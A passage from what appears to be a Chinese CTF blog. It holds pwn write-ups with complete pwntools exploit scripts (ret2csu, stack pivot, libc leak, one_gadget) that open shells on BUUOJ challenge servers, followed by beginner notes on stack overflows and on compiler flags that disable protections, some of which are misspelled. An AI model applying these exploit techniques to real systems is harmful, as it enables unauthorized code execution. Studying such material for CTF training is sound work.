alt="image-20230729164622920"></p><p>查看vuln函数发现两个系统调用：read和write 以及syscall函数</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164913572.png" alt="image-20230729164913572"></p><p>同时rax被改成了0x3B，对应调用execve函数.</p><p>使用ROPgadget查看可利用的gadget.<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729165814524.png" alt="image-20230729165814524"></p><p>可以看到我们只能单独控制rdi，不能控制rsi，rdx的值.那就ret2csu（当然专题废话hh）控制rdx和rsi参数，最后执行mov rax，0x3b； syscall即可.</p><p>so 难点来了：怎么把参数地址存入rdi？<br>由于我们控制不了rax的值，无法使用系统调用将其设置为0.bss段写不了，只能写入程序给我们的特定位置来了，意味着我们需要泄露栈上的地址.看看程序是否为我们提供了可以利用的代码.</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729171034681.png" alt="image-20230729171034681"></p><p>第三个参数为0x30</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729171514964.png" alt="image-20230729171514964"></p><p>buf距离栈顶只有10字节距离，因此write函数可以打印出栈中内容.</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729172115885.png" alt="image-20230729172115885"></p><p>测试只能显示48字节 gdb调式0x30刚刚好（具体之后补充）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729172330284.png" alt="image-20230729172330284"></p><p>先发送1然后gdb查看<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729224838828.png" alt="image-20230729224838828"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729231040910.png" alt="image-20230729231040910"></p><p>泄露的内容是红线的部分（当然由于只能泄露0x30个字节，我红线圈多了，但是我想强调的是栈地址泄露，泄露的是内容，而非栈的地址）</p><p>不过我们发现了第一个和第三个泄露的栈中的内容是指向了栈的地址，这样我们就可以用泄露的栈的内容配合偏移，来获取栈的地址了.</p><p>经过调试发现，vul函数的返回地址就是此时栈顶的，我们是要劫持程序的执行流，因此第一个地址肯定是没法泄露了，我们来泄露第三个栈的内容。然后把返回地址填写成vul函数的首地址，让程序再执行一次（去进行ret2csu）</p><p>拿到栈中第三个内容后，看一下它距离我们输入的内容的首地址偏移是多少.<br><img src="https://img2022.cnblogs.com/blog/2706180/202202/2706180-20220218171939424-200600591.png" alt="img"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26250</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./a&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">csu_gadget1 = <span class="number">0x40059A</span></span><br><span class="line">modify_rax = <span class="number">0x4004E2</span></span><br><span class="line">csu_gadget2 = <span class="number">0x400580</span></span><br><span class="line">term_proc = <span class="number">0x600e50</span><span class="comment">#pwndbg&gt;search -p 地址 查找</span></span><br><span class="line">bss_addr = <span class="number">0x601030</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">read_syscall = <span class="number">0x4004ED</span></span><br><span class="line">offset = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>, <span class="string">&#x27;\x00&#x27;</span>).encode() + p64(read_syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x05\x40\x00\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">bin_sh_addr = leak_addr - <span class="number">280</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>, <span class="string">&#x27;\x00&#x27;</span>).encode() + p64(csu_gadget1)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(term_proc)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu_gadget2)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line">payload += p64(modify_rax)</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(bin_sh_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h4><p>其实可以直接ret2libc（🤡）w 学习记录了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25408</span>)</span><br><span class="line"></span><br><span class="line">bank=<span class="number">0x0601080</span></span><br><span class="line">leave=<span class="number">0x400699</span></span><br><span class="line">puts_plt=<span class="number">0x04004E0</span></span><br><span class="line">puts_got=<span class="number">0x0601018</span></span><br><span class="line">pop_rdi=<span class="number">0x400703</span></span><br><span class="line">main=<span class="number">0x0400626</span></span><br><span class="line">ret=<span class="number">0x4004c9</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;u want&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(bank)+p64(leave)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;now!&#x27;</span>)</span><br><span class="line">payload=p64(ret)*<span class="number">20</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvline()</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#system=libc_base+libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload=b&#x27;a&#x27;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">8</span>)+p64(one_gadget)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><strong>思路：</strong>利用puts函数泄露libc得到 在bss段上写入利用rop写入shellcode</p><p><strong>问题：</strong>buf只有0x10大小，如何在bss段顺利写入呢？<br><strong>Answer：</strong>buf只能覆盖到ret，但bank（）在bss段<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005633820.png"></p><p>在buf处利用leave指令劫持栈跳转到bank处，写入shellcode</p><p>（1）checksec</p><p>   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731004821556.png" alt="image-20230731004821556"></p><p>（2）Lovely Woman  <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005122883.png" alt="image-20230731005122883"></p><p>NX保护打开，栈上无system（）和”&#x2F;bin&#x2F;sh” -&gt;libc泄露</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005742112.png" alt="image-20230731005742112"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt_addr=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#why got here </span></span><br><span class="line"><span class="comment">#call函数为跳转到某地址内所保存的地址，应该使用got表中的地址</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span><span class="comment">#bank_addr</span></span><br><span class="line">ret_csu_addr=<span class="number">0x4006FA</span></span><br><span class="line">rsi_addr=<span class="number">0x601118</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(bss_addr+<span class="number">0x40</span>)+p64(level_addr)<span class="comment">#这里多加0x40的目的就是为了执行puts的时候，不影响之前的got表中的数据</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;u want\n&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(ret_csu_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(read_plt_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload2+=p64(rsi_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x4006E0</span>)<span class="comment">#why is there an address here</span></span><br><span class="line"><span class="comment">#这一个4006E0仅仅是ret2csu执行了pop之后的ret的返回的地址。</span></span><br><span class="line"><span class="comment">#至于怎么返回到one_gadget上的，是因为read的返回地址被read自己给改了</span></span><br><span class="line"><span class="comment">#payload2中的第一个p64(0)是去占个地方，因为栈迁移本身的特性，迁移后的第一个内存单元不执行</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;k now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f432</span></span><br><span class="line">p.sendline(p64(one_gadget))<span class="comment">#why p64 here #只要是发送地址 就要经过打包之后发送</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>❗❗❗u1s1❗❗❗<br>不管用哪个方法，都需要考虑利用函数（bank）与got表间距离.在栈迁时需要把地址相对抬高些，防止破坏got表.</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731155611578.png" alt="image-20230731155611578"></p><p>下附栈迁移相关资料：</p><p>[]: <a href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">https://www.cnblogs.com/ZIKH26/articles/15817337.html</a></p><p><strong>tips：</strong>没法泄露libc时可用one_gadget，利用在线网站</p><p>[]: <a href="https://libc.blukat.me/?q=puts:690&amp;l=libc6_2.23-0ubuntu11_amd64">https://libc.blukat.me/?q=puts:690&amp;l=libc6_2.23-0ubuntu11_amd64</a></p><p>将泄露函数（本题为puts 其他函数是否相同 有待考究）的后三位，找到libc版本</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>one_gadget libc版本</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn,知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn探索--大杂烩</title>
      <link href="/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>pwn的核心：二进制漏洞的利用和挖掘<br>研究层次：编译成机器码的二进制程序的漏洞二进制程序实际为可执行文件<br>linux系统下ELF&#x3D;windows系统下EXE文件<br><strong>一次简单的hack</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307002535708.png" alt="image-20230307002535708"></p><p>CTF中pwn攻击脚本思路：</p><p>1.pwn程序&#x2F;服务器（必不可少滴）开端——&gt;from pwn import*<br>2.使用python中pwn tools用remote函数打开远端需要攻击的服务器端口<br>3.进行链接<br>4.构造恶意数据<br>5.发送恶意数据<br>6.使用交互函数（io.interactive（））获取flag</p><h5 id="程序的编译与链接"><a href="#程序的编译与链接" class="headerlink" title="程序的编译与链接"></a><strong>程序的编译与链接</strong></h5><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206225702913.png" alt="image-20230206225702913"></p><p>linux借助文件头进行识别!（用vim打开可查看源码–&gt;%!xxd可查看十六进制表示）<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206230237084.png" alt="image-20230206230237084"></p><h5 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a><strong>编译过程</strong></h5><p>ls指list file即列出文件；可用ll查看文件详细内容。<br>gcc兼具编译器和汇编器的功能。<br>ctrl+alt+t 启动shell</p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206231832031.png" alt="image-20230206231832031" style="zoom:150%;" /><p>Linux环境下执行可执行文件<br>!xdd%-r 还原文件<br>rm a.out 删除<br>.&#x2F;a.out 是linux&#x2F;unix环境下gcc编译源代码(c&#x2F;c++)并连来接产生的默认执行文件名。.&#x2F;a.out表示当前目录下的a.out文件。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206232441503.png" alt="image-20230206232441503"></p><p>链接<br>动态链接：printf的代码到动态链接库里；<br>静态链接：printf中的代码直接写好在对应文件中<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206235815274.png" alt="image-20230206235815274"><br><strong>文件权限不够时如何处理得到shell</strong><br>下以python3为例</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208112405419.png" alt="image-20230208112405419"></p><p>mv命令：用户可以使用mv命令来为文件或目录改名或将文件由一个目录移入另一个目录中。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208141609541.png" alt="image-20230208141609541"></p><p>段用来标注进程、印象代码段权限。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208142032344.png" alt="image-20230208142032344"></p><p>.&#x2F;时才被读入内存<br>cache越大（M存储），cpu速度越快。</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208151435139.png" alt="image-20230208151435139"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208152953051.png" alt="image-20230208152953051"></p><p>实模式下运行（易受到攻击）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208161344724.png" alt="image-20230208161344724"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208161302543.png" alt="image-20230208161302543"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208162239886.png" alt="image-20230208162239886"></p><p>十六进制转二进制</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208162610999.png" alt="image-20230208162610999"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208164349628.png" alt="image-20230208164349628"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208164650781.png" alt="image-20230208164650781"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208170556987.png" alt="image-20230208170556987"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208170832516.png" alt="image-20230208170832516"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208172413117.png" alt="image-20230208172413117"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208173923251.png" alt="image-20230208173923251"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208173818672.png" alt="image-20230208173818672"></p><p>C语言函数栈帧<br>栈帧：记录一个函数此时的状态信息<br>函数的栈底由EBP或RBP保存<br>函数的栈顶由ESP或RSP保存</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209094759828.png" alt="image-20230209094759828"></p><p>32位视图<br>子函数所用参数保存在父函数栈帧的末尾<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209100855874.png" alt="image-20230209100855874"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209101728223.png" alt="image-20230209101728223"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209102340553.png" alt="image-20230209102340553"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209102615915.png" alt="image-20230209102615915"></p><p>push ebp保持父函数栈底的空间<br>sum函数调用完后需要恢复main函数的信息，即在调用sum函数前需将mian函数栈底压入。<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209103333679.png" alt="image-20230209103333679"></p><p>栈的栈顶一定是当前执行函数所属的栈帧。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230209104000217.png" alt="image-20230209104000217"></p><p>无需舍弃只需标记为不需使用值即可——&gt;扩大esp到ebp处（避开局部变量存储空间）<br><strong>注意：此过程中变化为对应值的地址存储在ebp中——&gt;对应值存储在ebp中</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209105139584.png" alt="image-20230209105139584"></p><p>ebp减小一个字长；esp加一个字长。通过return指令将return address弹出保存在eap（指令寄存器）中<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230209110221569.png" alt="image-20230209110221569"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209110919361.png" alt="image-20230209110919361"></p><p>call指令自带保存返回地址。<br>leave：将esp ebp放于同一位置后popebp。<br>pop总是将esp指向的值对应的1字长数据传入到目标位置</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209112610898.png" alt="image-20230209112610898"></p><p><strong>缓冲区溢出中</strong> <strong>栈溢出控制程序流核心：</strong><br>当子函数返回父函数时会将<em>Ruturn Adress</em>中的值返回到PC寄存器eip（32位）中，当eip中值写入目标值的地址，既可<em>完成程序执行流的控制</em>。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230216235806404.png" alt="image-20230216235806404"></p><p>举例演示：<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219153353227.png" alt="image-20230219153353227"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> str[<span class="number">8</span>];</span><br><span class="line">   read (<span class="number">0</span>,str,<span class="number">24</span>);</span><br><span class="line">   retrun <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时产生segmentation fault（段错误）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219154052743.png" alt="image-20230219154052743"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230219154202756.png" alt="image-20230219154202756"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219161736349.png" alt="image-20230219161736349"></p><p>安全保护措施（拿到二进制文件之后先检查）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219165330509.png"></p><p><strong>注意</strong>：<em>出现gets函数必有栈溢出！</em>strart函数无法F5（编写时已用汇编代码实现）<br>vulnerable——&gt;可怜受害者函数捏~</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221002608337.png" alt="image-20230221002608337"></p><p>ctrl+A后：可看C和汇编比较<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221002832185.png" alt="image-20230221002832185"></p><p>ctrl+s–&gt;保存<br>(Fn+)shift+F12-&gt;打开字符串界面（ASCII范围内的字符串）<br>打开目标文件得关键句逐层剖析反汇编get完整main体-&gt;end<br>pwntools:nc转到问题变量本体<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221160248520.png" alt="image-20230221160248520"></p><p>CTF建议：pip2+pip3均安装<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221160924626.png" alt="image-20230221160924626">+<strong>代理地址可进行安装</strong>vi</p><p>拿到题目——&gt;先拿到本地shell——&gt;pwntools攻击——&gt;io本地切换为远程（脚本不变）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221162513214.png" alt="image-20230221162513214"></p><p>链接：process()-&gt;本地；remote（）—&gt;远程<br>函数：<br>io.recvline() 接收一行字符串；           io.recv（）接收多行字符串<br>io.send() <strong>注意：函数内部只能为字节流（即为二进制表示）</strong><br>io.send(p32(0)+b” ╰(<em>°▽°</em>)╯——&gt;表示bite对象”)<br>io.sendline()——&gt;一直读取直到\0或\n;<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221165139013.png" alt="image-20230221165139013"></p><p>nc tools地址 ❗❗❗flag隐藏在其中❗❗❗<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221165745894.png" alt="image-20230221165745894"></p><p>python3开  remote(“ip”,端口)<br>特殊控制符\r——&gt; 输出当前行后持续进行清空<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221171244473.png" alt="image-20230221171244473"></p><p>base64工具（pwntools工具）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221171442165.png" alt="image-20230221171442165"></p><p>❗BASE64:包含大写字母（A-Z）,小写字母（a-z），数字（0-9）以及+&#x2F; 一般带&#x3D;&#x3D;<br>❗BASE32:只有大写字母（A-Z）和数字234567 一般带&#x3D;&#x3D;&#x3D;<br>❗BASE16即为16进制<br><strong>当ASCll用Base加密达不到所对应的位数的时候用&#x3D;号补齐</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221234220854.png" alt="image-20230221234220854"></p><blockquote><p>cd “你想要进的目录” &#x2F;&#x2F;当目录名称中含有空格、中文或其它<a href="https://baike.baidu.com/item/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/112715?fromModule=lemma_inlink">特殊字符</a>时请用<a href="https://baike.baidu.com/item/%E5%8F%8C%E5%BC%95%E5%8F%B7/10758658?fromModule=lemma_inlink">双引号</a>包括</p><p>以下是最常用的几个目录的写法：</p><p>&#x2F; 代表<a href="https://baike.baidu.com/item/%E6%A0%B9%E7%9B%AE%E5%BD%95/6061330?fromModule=lemma_inlink">根目录</a></p><p>. 当前目录</p><p>.. 上级目录</p><p>~ 当前用户的默认工作目录</p><p>目录可以省略不写， 与cd ~ 有相同的效果</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230222002023021.png" alt="image-20230222002023021"></p><p>关闭标准输入输出的缓冲区 使得其中内容可以立马显示出来 ctrl+#调小字体<br>下断点方式：pwndbg中b *+一个地址 或者b + 一个函数<br>先下断点后run  gdb中运行输入首字母即可  例：n——&gt;步过    s——&gt;standin<br>下断点：b（breakpoint）  * +地址&#x2F;函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230222191527599.png" alt="image-20230222191527599"></p><p>此时可修改部分为buffer（8字节）即eax到ebp部分（16大小）覆盖时需+4（覆盖ebp）<br>持续向下写<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223075312799.png" alt="image-20230223075312799">找到后门函数system 注：可不是次次这么便宜的哦🤣<br>syetem返回字符串&#x3D;在shell中直接执行字符串 pwd：打印工作目录<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223075541707.png" alt="image-20230223075541707"></p><p>使得vualable return到shell即可<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223104016114.png" alt="image-20230223103831511"></p><p>p（pack）对数据进行打包变为字符型数据 ； 例：p32（0x8048522）打包为32bite位字符</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223104016114.png" alt="image-20230223104016114"></p><p>gcc：Linux环境下的一款编译器。<br>ctrl+d 退出python交互环境!<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223112513513.png" alt="image-20230223112513513"><br>bss默认栈可执行<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230411152517155.png" alt="image-20230411152517155"><br>关闭随机化（ASLR）</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-fro-stack-protector 关闭canary</span></span><br><span class="line"><span class="deletion">-z exexstack 打开栈的可执行权限</span></span><br><span class="line"><span class="deletion">-no-pie 关闭pie（程序编译时打开pie 将地址随机化为无关代码 即随机化elf文件）</span></span><br><span class="line"><span class="deletion">-g 带上调试信息 调试时可以看见源代码（ret2stack.c未删除情况下）</span></span><br><span class="line"><span class="deletion">-o 输出目标文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412200146471.png" alt="image-20230412200146471">chmod 